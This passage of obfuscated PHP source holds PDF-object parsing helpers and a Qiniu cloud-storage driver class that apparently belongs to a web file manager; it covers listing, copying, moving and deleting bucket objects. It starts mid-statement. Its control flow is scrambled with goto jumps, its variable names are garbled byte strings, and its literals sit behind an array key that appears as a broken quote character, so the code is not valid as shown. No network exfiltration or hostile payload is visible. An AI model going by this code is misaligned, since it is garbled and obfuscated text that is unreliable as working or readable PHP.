$BÔÂŠŠÌ¶Å[0] == $fÍÉ‰Õ†ŞÕ[8]) { $b¦ğ³šÔ = !1; if ($BğÄ«ğÛ¨»[0] == $fÍÉ‰Õ†ŞÕ[1555]) { $BğÄ«ğÛ¨» = self::getObject($F¥íÌØî¹¶, $f”Ñøë¾ËÕ[$fÍÉ‰Õ†ŞÕ[1540]][$BğÄ«ğÛ¨»[1]]); } $b¦ğ³šÔ = $BğÄ«ğÛ¨»[1]; if ($b¦ğ³šÔ === !1) { continue; } if (is_string($b¦ğ³šÔ)) { $b¦ğ³šÔ = self::decodeStr($b¦ğ³šÔ); } $d‘¨Æ£îÒ[$BÔÂŠŠÌ¶Å[1]] = $b¦ğ³šÔ; } } goto eŞ˜‡‰„Âò; C£ˆÄŸ“ä…: $fÍÉ‰Õ†ŞÕ =& $_SERVER[“]; $E‹á…òˆ¹ = self::getObject($F¥íÌØî¹¶, $f”Ñøë¾ËÕ[$fÍÉ‰Õ†ŞÕ[1540]][$aø»è‡æ¶§]); if (is_string($E‹á…òˆ¹[1])) { return $E‹á…òˆ¹[1]; } goto F¸øÕî†²; bÙ±»»ïß: } private static function getObject($BŠºÏ‚“Ï, $a‰š­ŠàËÖ) { $B¡Øù¶àáâ = self::getObjectItem($BŠºÏ‚“Ï, $a‰š­ŠàËÖ); $B¡Øù¶àáâ = self::getObjectItem($BŠºÏ‚“Ï, $B¡Øù¶àáâ[2]); return $B¡Øù¶àáâ; } private static function getObjectItem($bµò©„…Ò™, $b¥¶ÓÁÉ¡) { goto cóİÌ´ÎÒ«; Eš†–À Î: $C˜‰ÌîÎØ = $b¥¶ÓÁÉ¡ >= $e­ç©ßÑí½ ? $b¥¶ÓÁÉ¡ - $e­ç©ßÑí½ : $b¥¶ÓÁÉ¡; $bç¨³Ì‹Ê = $b¥¶ÓÁÉ¡ >= $e­ç©ßÑí½ ? $bµò©„…Ò™[$DáíÃòôİ—[1520]] : $bµò©„…Ò™[$DáíÃòôİ—[1519]]; if ($b¥¶ÓÁÉ¡ > $A’Ô‰ĞÃÏ && $b¥¶ÓÁÉ¡ <= $e­ç©ßÑí½) { $C˜‰ÌîÎØ = 0; $bç¨³Ì‹Ê = StreamWrapperIO::read($bµò©„…Ò™[$DáíÃòôİ—[75]], $b¥¶ÓÁÉ¡, $A’Ô‰ĞÃÏ); } goto eñŠ”êÙÇ; cóİÌ´ÎÒ«: $DáíÃòôİ— =& $_SERVER[“]; $A’Ô‰ĞÃÏ = $bµò©„…Ò™[$DáíÃòôİ—[1518]]; $e­ç©ßÑí½ = $bµò©„…Ò™[$DáíÃòôİ—[77]] - $A’Ô‰ĞÃÏ; goto Eš†–À Î; eñŠ”êÙÇ: $B’¦İö = self::getRawObject($bç¨³Ì‹Ê, $C˜‰ÌîÎØ); if ($b¥¶ÓÁÉ¡ >= $e­ç©ßÑí½) { $B’¦İö[2] = $B’¦İö[2] + $e­ç©ßÑí½; } else { if ($b¥¶ÓÁÉ¡ > $A’Ô‰ĞÃÏ && $b¥¶ÓÁÉ¡ <= $e­ç©ßÑí½) { $B’¦İö[2] = $B’¦İö[2] + $b¥¶ÓÁÉ¡; } } return $B’¦İö; goto d¶ç¤êõ×ª; d¶ç¤êõ×ª: } private static function decodeStr($D¦¸ö¾Š÷) { goto D‰ğ·µ™÷Û; f‰ÒßÄ¸ì: $D¦¸ö¾Š÷ = $f…÷ìŒ¢ğ«[33]; foreach ($añ¦ã¯Õƒ¤ as $c›½îíßó) { if (preg_match($f…÷ìŒ¢ğ«[1570], $c›½îíßó) && !1 === stripos($c›½îíßó, $f…÷ìŒ¢ğ«[1571])) { $c›½îíßó = preg_replace($f…÷ìŒ¢ğ«[1572], $f…÷ìŒ¢ğ«[33], $c›½îíßó); $c›½îíßó = trim($c›½îíßó, $f…÷ìŒ¢ğ«[912]); $c›½îíßó = pack($f…÷ìŒ¢ğ«[1573], $c›½îíßó); $D¦¸ö¾Š÷ .= $c›½îíßó; } else { $D¦¸ö¾Š÷ .= $c›½îíßó; } } if (preg_match($f…÷ìŒ¢ğ«[1574], $D¦¸ö¾Š÷)) { $F¹‡Ìó­’Õ = substr($D¦¸ö¾Š÷, 2); $D¦¸ö¾Š÷ = $f…÷ìŒ¢ğ«[33]; $aÂ”‘„Ô˜ = strlen($F¹‡Ìó­’Õ); for ($bÇ¿ÉÔç = 0; $bÇ¿ÉÔç < $aÂ”‘„Ô˜; $bÇ¿ÉÔç += 2) { $FÖ‡ÚÉ‘¥ = hexdec(bin2hex(substr($F¹‡Ìó­’Õ, $bÇ¿ÉÔç, 2))); $D¦¸ö¾Š÷ .= mb_convert_encoding($f…÷ìŒ¢ğ«[1575] . intval($FÖ‡ÚÉ‘¥) . $f…÷ìŒ¢ğ«[67], $f…÷ìŒ¢ğ«[1576], $f…÷ìŒ¢ğ«[1577]); } } goto c÷Äß’ô£ƒ; fâíóßì¢Ş: $D¦¸ö¾Š÷ = $f…÷ìŒ¢ğ«[33]; foreach ($añ¦ã¯Õƒ¤ as $c›½îíßó) { if (preg_match($f…÷ìŒ¢ğ«[1567], $c›½îíßó)) { $D¦¸ö¾Š÷ .= \chr(hexdec(trim($c›½îíßó, $f…÷ìŒ¢ğ«[1568]))); } else { $D¦¸ö¾Š÷ .= $c›½îíßó; } } $añ¦ã¯Õƒ¤ = preg_split($f…÷ìŒ¢ğ«[1569], $D¦¸ö¾Š÷, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto f‰ÒßÄ¸ì; c÷Äß’ô£ƒ: return $D¦¸ö¾Š÷; goto f ¾¾²µ; b†ç‚ˆƒ¥: $D¦¸ö¾Š÷ = $f…÷ìŒ¢ğ«[33]; foreach ($añ¦ã¯Õƒ¤ as $c›½îíßó) { if (preg_match($f…÷ìŒ¢ğ«[1565], $c›½îíßó)) { $D¦¸ö¾Š÷ .= \chr(octdec(trim($c›½îíßó, $f…÷ìŒ¢ğ«[93]))); } else { $D¦¸ö¾Š÷ .= $c›½îíßó; } } $añ¦ã¯Õƒ¤ = preg_split($f…÷ìŒ¢ğ«[1566], $D¦¸ö¾Š÷, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto fâíóßì¢Ş; D‰ğ·µ™÷Û: $f…÷ìŒ¢ğ« =& $_SERVER[“]; $D¦¸ö¾Š÷ = str_replace(array($f…÷ìŒ¢ğ«[1556], $f…÷ìŒ¢ğ«[1557], $f…÷ìŒ¢ğ«[1558], $f…÷ìŒ¢ğ«[1559], $f…÷ìŒ¢ğ«[1560], $f…÷ìŒ¢ğ«[1561], $f…÷ìŒ¢ğ«[1562], $f…÷ìŒ¢ğ«[1563]), array($f…÷ìŒ¢ğ«[93], $f…÷ìŒ¢ğ«[50], $f…÷ìŒ¢ğ«[8], $f…÷ìŒ¢ğ«[248], $f…÷ìŒ¢ğ«[803], $f…÷ìŒ¢ğ«[217], $f…÷ìŒ¢ğ«[979], $f…÷ìŒ¢ğ«[330]), $D¦¸ö¾Š÷); $añ¦ã¯Õƒ¤ = preg_split($f…÷ìŒ¢ğ«[1564], $D¦¸ö¾Š÷, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto b†ç‚ˆƒ¥; f ¾¾²µ: } private static function getRawObject($F´’ÉßèÆ®, $CÃ‡Ï«×ÑÜ = 0) { goto Fé›»ÃŠä; Bä†æÙŞáˆ: return array($aÊ·ß¼ØÍ, $A½¦Ş‹†ÃŞ, $CÃ‡Ï«×ÑÜ); goto a†˜êŠŒÜĞ; Fé›»ÃŠä: $FœÈ¶÷×Åˆ =& $_SERVER[“]; $aÊ·ß¼ØÍ = $FœÈ¶÷×Åˆ[33]; $A½¦Ş‹†ÃŞ = $FœÈ¶÷×Åˆ[33]; goto B¬„åñÆàç; B¬„åñÆàç: $CÃ‡Ï«×ÑÜ += strspn($F´’ÉßèÆ®, $FœÈ¶÷×Åˆ[1578], $CÃ‡Ï«×ÑÜ); $B»‚ï•¨ø = $F´’ÉßèÆ®[$CÃ‡Ï«×ÑÜ]; switch ($B»‚ï•¨ø) { case $FœÈ¶÷×Åˆ[1579]: $F÷…ò ¨” = strcspn($F´’ÉßèÆ®, $FœÈ¶÷×Åˆ[1580], $CÃ‡Ï«×ÑÜ); if ($F÷…ò ¨” > 0) { $CÃ‡Ï«×ÑÜ += $F÷…ò ¨”; return self::getRawObject($F´’ÉßèÆ®, $CÃ‡Ï«×ÑÜ); } break; case $FœÈ¶÷×Åˆ[8]: $aÊ·ß¼ØÍ = $B»‚ï•¨ø; ++$CÃ‡Ï«×ÑÜ; $c“ÕÅ¸±ÇÎ = preg_match($FœÈ¶÷×Åˆ[1581], substr($F´’ÉßèÆ®, $CÃ‡Ï«×ÑÜ, 256), $cå¾´®›šÉ); if (1 == $c“ÕÅ¸±ÇÎ) { $A½¦Ş‹†ÃŞ = $cå¾´®›šÉ[1]; $CÃ‡Ï«×ÑÜ += strlen($A½¦Ş‹†ÃŞ); } break; case $FœÈ¶÷×Åˆ[248]: case $FœÈ¶÷×Åˆ[803]: $aÊ·ß¼ØÍ = $B»‚ï•¨ø; ++$CÃ‡Ï«×ÑÜ; $CŠ²è¹ßº‚ = $CÃ‡Ï«×ÑÜ; if ($FœÈ¶÷×Åˆ[248] == $B»‚ï•¨ø) { $Eï¶§İóİ = 1; while ($Eï¶§İóİ > 0) { if (!isset($F´’ÉßèÆ®[$CŠ²è¹ßº‚])) { break; } $F¼†¼¿ŒöÊ = $F´’ÉßèÆ®[$CŠ²è¹ßº‚]; switch ($F¼†¼¿ŒöÊ) { case $FœÈ¶÷×Åˆ[93]: ++$CŠ²è¹ßº‚; break; case $FœÈ¶÷×Åˆ[248]: ++$Eï¶§İóİ; break; case $FœÈ¶÷×Åˆ[803]: --$Eï¶§İóİ; break; } ++$CŠ²è¹ßº‚; } $A½¦Ş‹†ÃŞ = substr($F´’ÉßèÆ®, $CÃ‡Ï«×ÑÜ, $CŠ²è¹ßº‚ - $CÃ‡Ï«×ÑÜ - 1); $CÃ‡Ï«×ÑÜ = $CŠ²è¹ßº‚; } break; case $FœÈ¶÷×Åˆ[157]: case $FœÈ¶÷×Åˆ[478]: $aÊ·ß¼ØÍ = $B»‚ï•¨ø; ++$CÃ‡Ï«×ÑÜ; if ($FœÈ¶÷×Åˆ[157] == $B»‚ï•¨ø) { $A½¦Ş‹†ÃŞ = array(); do { $d–Ü‘×ËáÜ = $CÃ‡Ï«×ÑÜ; $fàŞä‹ÑƒÇ = self::getRawObject($F´’ÉßèÆ®, $CÃ‡Ï«×ÑÜ); $CÃ‡Ï«×ÑÜ = $fàŞä‹ÑƒÇ[2]; $A½¦Ş‹†ÃŞ[] = $fàŞä‹ÑƒÇ; } while ($FœÈ¶÷×Åˆ[478] != $fàŞä‹ÑƒÇ[0] && $CÃ‡Ï«×ÑÜ != $d–Ü‘×ËáÜ); array_pop($A½¦Ş‹†ÃŞ); } break; case $FœÈ¶÷×Åˆ[911]: case $FœÈ¶÷×Åˆ[914]: if (isset($F´’ÉßèÆ®[$CÃ‡Ï«×ÑÜ + 1]) && $F´’ÉßèÆ®[$CÃ‡Ï«×ÑÜ + 1] == $B»‚ï•¨ø) { $aÊ·ß¼ØÍ = $B»‚ï•¨ø . $B»‚ï•¨ø; $CÃ‡Ï«×ÑÜ += 2; if ($FœÈ¶÷×Åˆ[911] == $B»‚ï•¨ø) { $A½¦Ş‹†ÃŞ = array(); do { $d–Ü‘×ËáÜ = $CÃ‡Ï«×ÑÜ; $fàŞä‹ÑƒÇ = self::getRawObject($F´’ÉßèÆ®, $CÃ‡Ï«×ÑÜ); $CÃ‡Ï«×ÑÜ = $fàŞä‹ÑƒÇ[2]; $A½¦Ş‹†ÃŞ[] = $fàŞä‹ÑƒÇ; } while ($FœÈ¶÷×Åˆ[1582] != $fàŞä‹ÑƒÇ[0] && $CÃ‡Ï«×ÑÜ != $d–Ü‘×ËáÜ); array_pop($A½¦Ş‹†ÃŞ); } } else { $aÊ·ß¼ØÍ = $B»‚ï•¨ø; ++$CÃ‡Ï«×ÑÜ; $c“ÕÅ¸±ÇÎ = preg_match($FœÈ¶÷×Åˆ[1583], substr($F´’ÉßèÆ®, $CÃ‡Ï«×ÑÜ), $cå¾´®›šÉ); if ($FœÈ¶÷×Åˆ[911] == $B»‚ï•¨ø && 1 == $c“ÕÅ¸±ÇÎ) { $A½¦Ş‹†ÃŞ = strtr($cå¾´®›šÉ[1], $FœÈ¶÷×Åˆ[1584], $FœÈ¶÷×Åˆ[33]); $CÃ‡Ï«×ÑÜ += \strlen($cå¾´®›šÉ[0]); } elseif (!1 !== ($Cœ‡Å¡‚ÚÑ = strpos($F´’ÉßèÆ®, $FœÈ¶÷×Åˆ[914], $CÃ‡Ï«×ÑÜ))) { $CÃ‡Ï«×ÑÜ = $Cœ‡Å¡‚ÚÑ + 1; } } break; default: if ($FœÈ¶÷×Åˆ[1585] == substr($F´’ÉßèÆ®, $CÃ‡Ï«×ÑÜ, 6)) { $aÊ·ß¼ØÍ = $FœÈ¶÷×Åˆ[1585]; $CÃ‡Ï«×ÑÜ += 6; } elseif ($FœÈ¶÷×Åˆ[99] == substr($F´’ÉßèÆ®, $CÃ‡Ï«×ÑÜ, 4)) { $aÊ·ß¼ØÍ = $FœÈ¶÷×Åˆ[99]; $CÃ‡Ï«×ÑÜ += 4; $A½¦Ş‹†ÃŞ = $FœÈ¶÷×Åˆ[99]; } elseif ($FœÈ¶÷×Åˆ[1586] == substr($F´’ÉßèÆ®, $CÃ‡Ï«×ÑÜ, 4)) { $aÊ·ß¼ØÍ = $FœÈ¶÷×Åˆ[1587]; $CÃ‡Ï«×ÑÜ += 4; $A½¦Ş‹†ÃŞ = $FœÈ¶÷×Åˆ[1586]; } elseif ($FœÈ¶÷×Åˆ[1588] == substr($F´’ÉßèÆ®, $CÃ‡Ï«×ÑÜ, 5)) { $aÊ·ß¼ØÍ = $FœÈ¶÷×Åˆ[1587]; $CÃ‡Ï«×ÑÜ += 5; $A½¦Ş‹†ÃŞ = $FœÈ¶÷×Åˆ[1588]; } elseif ($FœÈ¶÷×Åˆ[1589] == substr($F´’ÉßèÆ®, $CÃ‡Ï«×ÑÜ, 6)) { $aÊ·ß¼ØÍ = $FœÈ¶÷×Åˆ[1589]; $CÃ‡Ï«×ÑÜ += 6; if (1 == preg_match($FœÈ¶÷×Åˆ[1590], substr($F´’ÉßèÆ®, $CÃ‡Ï«×ÑÜ), $cå¾´®›šÉ)) { $CÃ‡Ï«×ÑÜ += strlen($cå¾´®›šÉ[0]); $d¤ª‰ª³Ñ = $FœÈ¶÷×Åˆ[1591]; $c“ÕÅ¸±ÇÎ = preg_match($d¤ª‰ª³Ñ, substr($F´’ÉßèÆ®, $CÃ‡Ï«×ÑÜ), $cå¾´®›šÉ, PREG_OFFSET_CAPTURE); if (1 == $c“ÕÅ¸±ÇÎ) { $A½¦Ş‹†ÃŞ = substr($F´’ÉßèÆ®, $CÃ‡Ï«×ÑÜ, $cå¾´®›šÉ[0][1]); $CÃ‡Ï«×ÑÜ += $cå¾´®›šÉ[1][1]; } } } elseif ($FœÈ¶÷×Åˆ[1592] == substr($F´’ÉßèÆ®, $CÃ‡Ï«×ÑÜ, 9)) { $aÊ·ß¼ØÍ = $FœÈ¶÷×Åˆ[1592]; $CÃ‡Ï«×ÑÜ += 9; } elseif (1 == preg_match($FœÈ¶÷×Åˆ[1593], substr($F´’ÉßèÆ®, $CÃ‡Ï«×ÑÜ, 33), $cå¾´®›šÉ)) { $aÊ·ß¼ØÍ = $FœÈ¶÷×Åˆ[1555]; $CÃ‡Ï«×ÑÜ += strlen($cå¾´®›šÉ[0]); $A½¦Ş‹†ÃŞ = intval($cå¾´®›šÉ[1]) . $FœÈ¶÷×Åˆ[70] . intval($cå¾´®›šÉ[2]); } elseif (1 == preg_match($FœÈ¶÷×Åˆ[1594], substr($F´’ÉßèÆ®, $CÃ‡Ï«×ÑÜ, 33), $cå¾´®›šÉ)) { $aÊ·ß¼ØÍ = $FœÈ¶÷×Åˆ[1595]; $A½¦Ş‹†ÃŞ = intval($cå¾´®›šÉ[1]) . $FœÈ¶÷×Åˆ[70] . intval($cå¾´®›šÉ[2]); $CÃ‡Ï«×ÑÜ += strlen($cå¾´®›šÉ[0]); } elseif (($CÌÌäÄ¨Äƒ = strspn($F´’ÉßèÆ®, $FœÈ¶÷×Åˆ[1596], $CÃ‡Ï«×ÑÜ)) > 0) { $aÊ·ß¼ØÍ = $FœÈ¶÷×Åˆ[1597]; $A½¦Ş‹†ÃŞ = substr($F´’ÉßèÆ®, $CÃ‡Ï«×ÑÜ, $CÌÌäÄ¨Äƒ); $CÃ‡Ï«×ÑÜ += $CÌÌäÄ¨Äƒ; } break; } goto Bä†æÙŞáˆ; a†˜êŠŒÜĞ: } } goto eñ»ùó†Šä; D³ÅÚ§åêœ: class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public function __construct($C‚çì¾†) { parent::__construct(); require_once SDK_DIR . $_SERVER[“][1199]; $this->_init($C‚çì¾†); } public function _init($c‘·¿Öá®­) { foreach ($c‘·¿Öá®­ as $bƒ¬Ò‚÷ => $DÑŠïƒÇ«) { if (isset($this->{$bƒ¬Ò‚÷})) { $this->{$bƒ¬Ò‚÷} = $DÑŠïƒÇ«; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[“][1200], !1); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($c´¤ïáĞî, $A‚Š‰Ã¼ä = '', $b¹œĞ¤œ›¡ = REPEAT_RENAME) { if ($this->setContent($c´¤ïáĞî, $A‚Š‰Ã¼ä)) { return $this->getPathOuter($c´¤ïáĞî); } return !1; } public function mkdir($a¢ˆºé¼‚‡, $aÄ§Èöë¡ = REPEAT_SKIP) { goto CÏ³ò…¨®æ; CÏ³ò…¨®æ: $CÛ†îîí“Ï =& $_SERVER[“]; $eÓ—‹‡¬®ƒ = trim($a¢ˆºé¼‚‡, $CÛ†îîí“Ï[8]); if ($this->_isFolder($eÓ—‹‡¬®ƒ)) { return $this->getPathOuter($eÓ—‹‡¬®ƒ); } goto Eñ†¨¹×˜á; Eñ†¨¹×˜á: $a¢ˆºé¼‚‡ = $eÓ—‹‡¬®ƒ . $CÛ†îîí“Ï[8]; $f‚¥Ç“Æ“ò = get_path_this($eÓ—‹‡¬®ƒ); $aô§´®“˜à = $a¢ˆºé¼‚‡ . $f‚¥Ç“Æ“ò; goto F‚íñ¨†Œ¦; F‚íñ¨†Œ¦: if (!$this->mkfile($aô§´®“˜à)) { return !1; } if (!$this->moveFile($aô§´®“˜à, $a¢ˆºé¼‚‡)) { $this->delFile($aô§´®“˜à); return !1; } return $this->getPathOuter($eÓ—‹‡¬®ƒ); goto a›ÎÉÜ‡˜Õ; a›ÎÉÜ‡˜Õ: } public function copyFile($eÂÀ‹†¬ë‚, $a©ĞÁ‚»Â‡) { $FÑğöÓÅŒ¦ = $this->bucketManager->copy($this->bucket, $eÂÀ‹†¬ë‚, $this->bucket, $a©ĞÁ‚»Â‡, !0); return $FÑğöÓÅŒ¦ ? !1 : $this->getPathOuter($a©ĞÁ‚»Â‡); } public function moveFile($Cå»…‹æÉ‰, $BÁİ¦µÛÛ) { $a‡…ÛÚ¯ö = $this->bucketManager->move($this->bucket, $Cå»…‹æÉ‰, $this->bucket, $BÁİ¦µÛÛ, !0); return $a‡…ÛÚ¯ö ? !1 : $this->getPathOuter($BÁİ¦µÛÛ); } public function delFile($aîÑÁ¼ÔÍö) { $E’»Á¢¿‡ = $this->bucketManager->delete($this->bucket, $aîÑÁ¼ÔÍö); return $E’»Á¢¿‡ ? !1 : !0; } public function delFolder($f¹ª–ß¦°) { $d™Á¬åÅƒ° = $this->fileList($f¹ª–ß¦°); if (empty($d™Á¬åÅƒ°)) { return !0; } $F¹î¨øá´ó = 1000; if (count($d™Á¬åÅƒ°) <= $F¹î¨øá´ó) { return $this->qnDelObj($d™Á¬åÅƒ°) ? !1 : !0; } foreach (array_chunk($d™Á¬åÅƒ°, $F¹î¨øá´ó) as $dÎˆÛæ›¯Ó) { $añùâ¤Ò® = $this->qnDelObj($dÎˆÛæ›¯Ó); if ($añùâ¤Ò®) { return !1; } } return !0; } private function qnDelObj($BÜùœøÕ) { $Eî‰“õğ•Ï = $this->bucketManager->buildBatchDelete($this->bucket, $BÜùœøÕ); list($F†«ÀŠÃĞö, $dƒ„ĞçâÀ”) = $this->bucketManager->batch($Eî‰“õğ•Ï); return $dƒ„ĞçâÀ”; } private function fileList($E‡ƒÕ Ó«, $bŠºâÖ™Š¯ = 0) { goto Fù…·Û¿Ü÷; aóâ–›±œÂ: $Eøó£ëù«• = array(); while (!0) { list($bĞĞçˆÏ¾, $eÙ—”™óÍ©) = $this->bucketManager->listFiles($this->bucket, $eˆ¸ˆÕ¤ïÑ, $bÈâ»Ş¤ÑŠ, $DÛë¼›º¡, $dä’ŸÎÈ—õ); if ($eÙ—”™óÍ©) { return !1; } $bÈâ»Ş¤ÑŠ = array_key_exists($E¹â…œº™§[1170], $bĞĞçˆÏ¾) ? $bÈâ»Ş¤ÑŠ = $bĞĞçˆÏ¾[$E¹â…œº™§[1201]] : $E¹â…œº™§[33]; foreach ($bĞĞçˆÏ¾[$E¹â…œº™§[1202]] as $BÁ’í³î†) { $D»ô›×Ş‹Ë = $BÁ’í³î†[$E¹â…œº™§[89]]; if ($bŠºâÖ™Š¯) { $D»ô›×Ş‹Ë = array($E¹â…œº™§[28] => $D»ô›×Ş‹Ë, $E¹â…œº™§[77] => $BÁ’í³î†[$E¹â…œº™§[1203]]); } $Eøó£ëù«•[] = $D»ô›×Ş‹Ë; } if ($bÈâ»Ş¤ÑŠ == $E¹â…œº™§[33]) { break; } } return $Eøó£ëù«•; goto fï‚¦ßœ¶; a‰ŠøËŠ…“: $bÈâ»Ş¤ÑŠ = $E¹â…œº™§[33]; $DÛë¼›º¡ = 1000; $dä’ŸÎÈ—õ = $E¹â…œº™§[33]; goto aóâ–›±œÂ; Fù…·Û¿Ü÷: $E¹â…œº™§ =& $_SERVER[“]; $E‡ƒÕ Ó« = trim($E‡ƒÕ Ó«, $E¹â…œº™§[8]); $eˆ¸ˆÕ¤ïÑ = empty($E‡ƒÕ Ó«) ? $E¹â…œº™§[33] : $E‡ƒÕ Ó« . $E¹â…œº™§[8]; goto a‰ŠøËŠ…“; fï‚¦ßœ¶: } public function rename($d§Ş›…‚›, $e•ÀøÔŸ) { return $this->renameObject($d§Ş›…‚›, $e•ÀøÔŸ); } public function fileInfo($e˜”øâê¨É, $EïÅ–é©…§ = false, $EÜ¸²†ğò™ = array()) { goto fìªøù˜·„; c‡Å¼Î‹: if (empty($EÜ¸²†ğò™)) { $EÜ¸²†ğò™ = $this->objectMeta($e˜”øâê¨É); if (!$EÜ¸²†ğò™) { return $B’¸ªÃ¿; } } if (isset($EÜ¸²†ğò™[$b„“ø©Í[1204]])) { $B’¸ªÃ¿[$b„“ø©Í[107]] = substr($EÜ¸²†ğò™[$b„“ø©Í[1204]] . $b„“ø©Í[33], 0, 10); } if (isset($EÜ¸²†ğò™[$b„“ø©Í[1203]])) { $B’¸ªÃ¿[$b„“ø©Í[77]] = $EÜ¸²†ğò™[$b„“ø©Í[1203]]; } goto AÔÑìŠÜ†İ; AÔÑìŠÜ†İ: return $B’¸ªÃ¿; goto EéÊÁ×±À†; fìªøù˜·„: $b„“ø©Í =& $_SERVER[“]; if ($EïÅ–é©…§) { return array($b„“ø©Í[28] => $this->pathThis($e˜”øâê¨É), $b„“ø©Í[75] => $this->getPathOuter($b„“ø©Í[8] . $e˜”øâê¨É), $b„“ø©Í[29] => $b„“ø©Í[167], $b„“ø©Í[77] => isset($EÜ¸²†ğò™[$b„“ø©Í[1203]]) ? $EÜ¸²†ğò™[$b„“ø©Í[1203]] : 0, $b„“ø©Í[160] => $this->ext($e˜”øâê¨É)); } $B’¸ªÃ¿ = array($b„“ø©Í[28] => $this->pathThis($e˜”øâê¨É), $b„“ø©Í[75] => $this->getPathOuter($b„“ø©Í[8] . $e˜”øâê¨É), $b„“ø©Í[29] => $b„“ø©Í[167], $b„“ø©Í[187] => 0, $b„“ø©Í[107] => 0, $b„“ø©Í[77] => 0, $b„“ø©Í[160] => $this->ext($e˜”øâê¨É), $b„“ø©Í[188] => !0, $b„“ø©Í[189] => !0); goto c‡Å¼Î‹; EéÊÁ×±À†: } public function folderInfo($d½ˆÚ„‚•, $F‘éêÎØç = false) { goto B½Œæ‚ˆéæ; E‡Ö´½½ªœ: $d½ˆÚ„‚• = rtrim($d½ˆÚ„‚•, $dÊš±–ØÖ¾[8]) . $dÊš±–ØÖ¾[8]; $BÇÅå·ö£Ë = $this->objectMeta($d½ˆÚ„‚•); if (isset($BÇÅå·ö£Ë[$dÊš±–ØÖ¾[1204]])) { $a÷ÔÎÜéè§[$dÊš±–ØÖ¾[107]] = substr($BÇÅå·ö£Ë[$dÊš±–ØÖ¾[1204]] . $dÊš±–ØÖ¾[33], 0, 10); } goto A²Å¾ õ£¯; A²Å¾ õ£¯: return $a÷ÔÎÜéè§; goto A—êµê½Ş; B½Œæ‚ˆéæ: $dÊš±–ØÖ¾ =& $_SERVER[“]; if ($F‘éêÎØç) { return array($dÊš±–ØÖ¾[28] => $this->pathThis($d½ˆÚ„‚•), $dÊš±–ØÖ¾[75] => $this->getPathOuter($dÊš±–ØÖ¾[8] . $d½ˆÚ„‚•), $dÊš±–ØÖ¾[29] => $dÊš±–ØÖ¾[76]); } $a÷ÔÎÜéè§ = array($dÊš±–ØÖ¾[28] => $this->pathThis($d½ˆÚ„‚•), $dÊš±–ØÖ¾[75] => $this->getPathOuter($dÊš±–ØÖ¾[8] . $d½ˆÚ„‚•), $dÊš±–ØÖ¾[29] => $dÊš±–ØÖ¾[76], $dÊš±–ØÖ¾[187] => 0, $dÊš±–ØÖ¾[107] => 0, $dÊš±–ØÖ¾[1149] => !0, $dÊš±–ØÖ¾[1150] => !0); goto E‡Ö´½½ªœ; A—êµê½Ş: } public function listPath($D’°Õæ¹âŞ, $EãñÃ—ëŠÂ = false) { goto D‡Í¬Ğ¶Ì¹; d¼È‘âÒ£¼: $e³ëí„ÎÇù = $BÑšİÚöó°[33]; $fÛïöø×š = 1000; $bº’õ«ƒ¾Ä = $BÑšİÚöó°[8]; goto fÉµ½éø‚£; D‡Í¬Ğ¶Ì¹: $BÑšİÚöó° =& $_SERVER[“]; $D’°Õæ¹âŞ = trim($D’°Õæ¹âŞ, $BÑšİÚöó°[8]); $fİ¼Šñœáœ = empty($D’°Õæ¹âŞ) ? $BÑšİÚöó°[33] : $D’°Õæ¹âŞ . $BÑšİÚöó°[8]; goto d¼È‘âÒ£¼; fÉµ½éø‚£: $Dà‚ˆÕ¥òß = $dì›Ç¸ŞÅ¸ = array(); while (!0) { list($c¬¶ÑÜËÂª, $C†ëÆÉœ›¹) = $this->bucketManager->listFiles($this->bucket, $fİ¼Šñœáœ, $e³ëí„ÎÇù, $fÛïöø×š, $bº’õ«ƒ¾Ä); if ($C†ëÆÉœ›¹) { return !1; } $e³ëí„ÎÇù = array_key_exists($BÑšİÚöó°[1170], $c¬¶ÑÜËÂª) ? $e³ëí„ÎÇù = $c¬¶ÑÜËÂª[$BÑšİÚöó°[1201]] : $BÑšİÚöó°[33]; if (isset($c¬¶ÑÜËÂª[$BÑšİÚöó°[1205]])) { foreach ($c¬¶ÑÜËÂª[$BÑšİÚöó°[1205]] as $eÜÈğÇìÕ) { if ($eÜÈğÇìÕ == $fİ¼Šñœáœ) { continue; } $Dà‚ˆÕ¥òß[] = $this->folderInfo($eÜÈğÇìÕ, $EãñÃ—ëŠÂ); } } if (isset($c¬¶ÑÜËÂª[$BÑšİÚöó°[1202]])) { foreach ($c¬¶ÑÜËÂª[$BÑšİÚöó°[1202]] as $d¦¼å²Ôßƒ) { if ($d¦¼å²Ôßƒ[$BÑšİÚöó°[89]] == $fİ¼Šñœáœ) { continue; } $dì›Ç¸ŞÅ¸[] = $this->fileInfo($d¦¼å²Ôßƒ[$BÑšİÚöó°[89]], $EãñÃ—ëŠÂ, $d¦¼å²Ôßƒ); } } if ($e³ëí„ÎÇù == $BÑšİÚöó°[33]) { break; } } return array($BÑšİÚöó°[74] => $Dà‚ˆÕ¥òß, $BÑšİÚöó°[73] => $dì›Ç¸ŞÅ¸); goto AÕ‡«Èé‰; AÕ‡«Èé‰: } public function has($cÙ¶Ş£ë¦, $Aøé¨Ê°½‡ = false, $B‹¡Øóª¼£ = true) { goto d×¹„¶ßÍÔ; F±ŒŞâ¥ÌÌ: $A„«á¿¯«¹ = $FË‚Ú’¼„[33]; $eñÎöõ¹ˆ = 1000; $bÂàÊ®ëÂ = $FË‚Ú’¼„[8]; goto fá¹ëİ‘¢É; a¾ğÜ¸˜Å‘: if ($Aøé¨Ê°½‡) { return array($FË‚Ú’¼„[191] => $aäñ³ÆÁÛ, $FË‚Ú’¼„[192] => $c…Áñø); } return !1; goto cÅŞ„™ÇÎë; d×¹„¶ßÍÔ: $FË‚Ú’¼„ =& $_SERVER[“]; $cÙ¶Ş£ë¦ = trim($cÙ¶Ş£ë¦, $FË‚Ú’¼„[8]); 